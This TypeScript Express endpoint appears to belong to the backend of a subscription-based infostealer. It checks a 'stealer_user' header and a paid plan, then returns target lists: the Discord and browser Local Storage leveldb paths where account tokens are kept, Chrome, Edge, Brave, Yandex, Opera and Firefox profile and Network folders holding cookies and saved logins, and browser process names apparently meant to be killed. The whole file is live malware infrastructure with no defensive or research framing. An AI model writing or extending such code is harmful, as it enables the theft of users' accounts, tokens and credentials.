import { Request, Response } from 'express';

import { PrismaClient } from '@prisma/client'

const prisma = new PrismaClient();

export default {
    name: `/api/paths`, method: 'get',

    async execute(req: Request, res: Response) {
      if(!req?.headers?.stealer_user) 
      return res.status(401);
      const user = await prisma.users.findFirst({
        where: {
            id: req?.headers?.stealer_user as string
        }
    });

    if(!user?.plan) 
    return res.status(401);

    res.status(200).json({
      discordTokens: {
      Discord: 'roaming' + '\\discord\\Local Storage\\leveldb\\',
      DiscordCanary: 'roaming' + '\\discordcanary\\Local Storage\\leveldb\\',
      LightCord: 'roaming' + '\\Lightcord\\Local Storage\\leveldb\\',
      DiscordPTB: 'roaming' + '\\discordptb\\Local Storage\\leveldb\\',
      Opera: 'roaming' + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
      OperaGX: 'roaming' + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
      Amigo: 'roaming' + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
      Torch: 'appdata' + '\\Torch\\User Data\\Local Storage\\leveldb\\',
      Kometa: 'appdata' + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
      Orbitum: 'appdata' + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
      CentBrowser: 'appdata' + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
      '7Star': 'appdata' + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
      Sputnik: 'appdata' + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
      Vivaldi: 'appdata' + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
      ChromeSxS: 'appdata' + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
      Chrome: 'appdata' + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
      'Chrome Profile 1': 'appdata' + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
      'Chrome Profile 2': 'appdata' + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
      'Chrome Profile 3': 'appdata' + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
      'Chrome Profile 4': 'appdata' + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
      'Chrome Profile 5': 'appdata' + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
      EpicPrivacyBrowser: 'appdata' + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
      Edge: 'appdata' + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
      Uran: 'appdata' + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
      YandexBrowser: 'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
      Brave: 'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
      Iridium: 'appdata' + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
   },
   browsers: [
      'appdata' + '\\Google\\Chrome\\User Data\\Default\\',
      'appdata' + '\\Google\\Chrome\\User Data\\Profile 1\\',
      'appdata' + '\\Google\\Chrome\\User Data\\Profile 2\\',
      'appdata' + '\\Google\\Chrome\\User Data\\Profile 3\\',
      'appdata' + '\\Google\\Chrome\\User Data\\Profile 4\\',
      'appdata' + '\\Google\\Chrome\\User Data\\Profile 5\\',
      'appdata' + '\\Google\\Chrome\\User Data\\Guest Profile\\',
      'appdata' + '\\Google\\Chrome\\User Data\\Default\\Network\\',
      'appdata' + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
      'appdata' + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
      'appdata' + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
      'appdata' + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
      'appdata' + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
      'appdata' + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
      'roaming' + '\\Mozilla\\Firefox\\Profiles\\',
      'roaming' + '\\Opera Software\\Opera Stable\\',
      'roaming' + '\\Opera Software\\Opera GX Stable\\',
      'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
      'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
      'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
      'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
      'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
      'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
      'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
      'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
      'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
      'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
      'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
      'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
      'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
      'appdata' + '\\Microsoft\\Edge\\User Data\\Default\\',
      'appdata' + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
      'appdata' + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
      'appdata' + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
      'appdata' + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
      'appdata' + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
      'appdata' + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
      'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
      'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
      'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
      'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
      'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
      'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
      'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
      'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
      'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
      'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
      'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
      'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
      'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
      'appdata' + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
      'appdata' + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
      'appdata' + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
      'appdata' + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
      'appdata' + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
      'appdata' + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
      'appdata' + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
   ],
   browsersProcesses: [
      'chrome', 'msedge', 'brave', 'firefox', 'opera', 'kometa', 'orbitum', 'centbrowser', '7star', 'sputnik', 'vivaldi',
      'epicprivacybrowser', 'uran', 'yandex', 'iridium'
   ]
  });
 },
};
